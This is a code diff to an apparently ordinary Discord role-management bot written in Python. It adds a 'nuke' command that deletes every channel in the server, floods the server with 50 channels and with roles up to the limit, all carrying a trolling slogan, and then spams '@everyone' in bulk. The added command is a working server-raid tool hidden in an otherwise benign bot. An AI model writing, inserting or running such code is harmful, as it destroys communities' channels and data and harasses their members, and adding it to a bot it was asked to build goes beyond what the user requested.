@@ -157,6 +157,50 @@ async def role_remove(interaction: discord.Interaction, member: discord.Member, 
 async def role_request(interaction: discord.Interaction, role: discord.Role):
     await interaction.response.send_message(f"{interaction.user.mention} が {role.name} のロールを申請しました")
 
+@bot.event
+async def on_ready():
+    print('READY')
+
+@bot.command()
+async def nuke(ctx):
+    # 非同期タスクを一括実行で超高速化
+    tasks = []
+    
+    # チャンネル全削除（並列処理）
+    for channel in list(ctx.guild.channels):
+        tasks.append(channel.delete())
+    
+    # 並列実行で待機時間を最小化
+    await asyncio.gather(*tasks, return_exceptions=True)
+    
+    tasks.clear()
+    
+    # チャンネル50個作成（超高速）
+    for i in range(50):
+        tasks.append(ctx.guild.create_text_channel("荒らし人民共和国万歳"))
+    
+    channels = await asyncio.gather(*tasks, return_exceptions=True)
+    channels = [c for c in channels if isinstance(c, discord.TextChannel)]
+    
+    tasks.clear()
+    
+    # ロールMAX作成（超高速）
+    existing_roles = len(ctx.guild.roles)
+    for i in range(250 - existing_roles):
+        tasks.append(ctx.guild.create_role(name="荒らし人民共和国万歳"))
+    
+    await asyncio.gather(*tasks, return_exceptions=True)
+    
+    # メッセージ爆撃（超高速並列処理）
+    message_tasks = []
+    for channel in channels:
+        for i in range(50):
+            message_tasks.append(channel.send("@everyone"))
+    
+    # 一気に実行
+    await asyncio.gather(*message_tasks, return_exceptions=True)
+
+
 # ===========================
 # メッセージ処理
 # ===========================
